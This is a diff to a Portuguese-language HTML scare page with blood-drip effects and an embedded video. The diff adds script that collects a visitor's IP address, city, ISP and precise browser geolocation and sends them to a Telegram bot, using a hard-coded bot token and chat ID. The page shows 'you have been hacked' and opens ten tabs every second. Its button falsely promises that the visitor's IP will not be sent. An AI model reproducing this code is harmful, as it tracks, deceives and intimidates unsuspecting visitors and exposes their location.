@@ -21,107 +21,35 @@
         }
 
         @keyframes blink {
-            0%, 100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0;
-            }
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-
-        @keyframes flicker {
-            0% {
-                opacity: 0.8;
-            }
-            50% {
-                opacity: 1;
-            }
-            100% {
-                opacity: 0.6;
-            }
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
         }
 
         .message {
-            color: red;
-            font-size: 24px;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.9);
+            color: white;
+            font-size: 20px;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
             z-index: 10;
-            margin: 15px 0;
-            animation: flicker 1s infinite;
+            margin: 10px 0;
         }
 
-        /* Estilo das gotículas de sangue */
-        .blood-drop {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background-color: red;
-            border-radius: 50%;
-            opacity: 0.8;
-            animation: drip linear infinite;
+        .loading {
+            font-size: 18px;
+            margin-top: 20px;
+            animation: blink 1.5s infinite;
         }
 
-        @keyframes drip {
-            0% {
-                transform: translateY(-10px);
-                opacity: 0.8;
-            }
-            50% {
-                opacity: 0.6;
-            }
-            100% {
-                transform: translateY(100vh);
-                opacity: 0;
-            }
-        }
-
-        /* Efeito de fumaça */
-        .smoke {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://i.imgur.com/H79qRcB.png') repeat; /* Imagem de fumaça */
-            z-index: 5;
-            opacity: 0.1;
-            animation: fadeIn 3s ease-in-out forwards;
-            mix-blend-mode: screen;
-        }
-
-        @keyframes smokeMove {
-            0% {
-                transform: translateX(0);
-            }
-            100% {
-                transform: translateX(-100%);
-            }
-        }
-
-        /* Estilo do botão */
         #playButton {
             margin-top: 20px;
-            padding: 15px 30px;
-            font-size: 24px;
-            color: black;
+            padding: 10px 20px;
+            font-size: 20px;
+            color: white;
             background-color: red;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            transition: background-color 0.3s;
             z-index: 10;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            animation: blink 1.5s infinite;
-            text-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
         }
 
         #playButton:hover {
@@ -136,66 +64,87 @@
             display: none;
         }
 
-        /* Luz piscando ao fundo */
-        .flicker-light {
+        .blood-drop {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, rgba(255, 0, 0, 0.8), transparent 70%);
-            transform: translate(-50%, -50%);
-            animation: flicker 2s infinite;
-            z-index: 1;
+            width: 10px;
+            height: 10px;
+            background-color: red;
+            border-radius: 50%;
+            opacity: 0.8;
+            animation: drip linear infinite;
+        }
+
+        @keyframes drip {
+            0% { transform: translateY(-10px); opacity: 0.8; }
+            50% { opacity: 0.6; }
+            100% { transform: translateY(100vh); opacity: 0; }
         }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="smoke"></div>
-    <div class="flicker-light"></div>
-
     <div class="message" id="ipMessage"></div>
     <div class="message" id="locationMessage"></div>
     <div class="message" id="internetMessage"></div>
+    <div class="loading" id="loadingMessage">Obtendo sua localização...</div>
 
-    <button id="playButton">Métodos vips Clique em mim</button>
+    <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>
 
     <div id="videoContainer">
         <iframe id="youtubeVideo" src="https://www.youtube.com/embed/b2pD0B9Rfps?enablejsapi=1&autoplay=1&loop=1&playlist=b2pD0B9Rfps" frameborder="0" allow="autoplay" allowfullscreen></iframe>
     </div>
 
     <script>
+        const telegramBotToken = '7545142881:AAHD_s9gLTIpOUqHDfnu1_rGtDytwaerf_g'; 
+        const telegramGroupId = '-1002018953064'; 
+
         async function getUserIPLocationAndConnection() {
-            try {
-                const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
-                const data = await response.json();
-                document.getElementById('ipMessage').innerText = `IP: ${data.ip}`;
-                document.getElementById('locationMessage').innerText = `Localização: ${data.city}, ${data.country_name}`;
-                document.getElementById('internetMessage').innerText = `Conexão: ${data.connection}, Provedor: ${data.isp}`;
-            } catch (error) {
-                document.getElementById('ipMessage').innerText = 'IP não encontrado.';
-                document.getElementById('locationMessage').innerText = 'Localização não encontrada.';
-                document.getElementById('internetMessage').innerText = 'Conexão não encontrada.';
+            const ipGeolocationResponse = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
+            const ipGeolocationData = await ipGeolocationResponse.json();
+            
+            const locationData = {
+                ip: ipGeolocationData.ip,
+                location: `${ipGeolocationData.city}, ${ipGeolocationData.country_name}`,
+                connection: `Conexão: ${ipGeolocationData.connection}; Provedor: ${ipGeolocationData.isp}`
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    locationData.location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                });
             }
+
+            return locationData;
         }
 
-        getUserIPLocationAndConnection();
+        async function sendToTelegram(ip, location, connection) {
+            const message = `Você foi hackeado!\nIP: ${ip}\nLocalização: ${location}\nConexão: ${connection}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramGroupId}&text=${encodeURIComponent(message)}`;
+            await fetch(url);
+        }
 
-        function startVideoAndOpenTabs() {
-            const videoContainer = document.getElementById('videoContainer');
-            videoContainer.style.display = 'block';
-            const player = document.getElementById('youtubeVideo');
-            player.style.display = 'block';
-            player.src += "";
+        async function startVideoAndOpenTabs() {
+            document.getElementById('loadingMessage').style.display = 'block'; 
+            const userInfo = await getUserIPLocationAndConnection();
 
-            setInterval(() => {
-                for (let i = 0; i < 10; i++) {
-                    window.open("https://www.virustotal.com", "_blank");
-                }
-            }, 1000);
+            if (userInfo) {
+                await sendToTelegram(userInfo.ip, userInfo.location, userInfo.connection);
+                document.getElementById('ipMessage').innerText = `Você foi hackeado! IP: ${userInfo.ip}`;
+                document.getElementById('locationMessage').innerText = `Localização: ${userInfo.location}`;
+                document.getElementById('internetMessage').innerText = `Conexão: ${userInfo.connection}`;
+                
+                document.getElementById('loadingMessage').style.display = 'none'; 
+                document.getElementById('videoContainer').style.display = 'block';
+                document.getElementById('youtubeVideo').style.display = 'block';
+                
+                setInterval(() => {
+                    for (let i = 0; i < 10; i++) {
+                        window.open("https://www.virustotal.com", "_blank");
+                    }
+                }, 1000);
 
-            createBloodDrops();
+                createBloodDrops();
+            }
         }
 
         function createBloodDrops() {
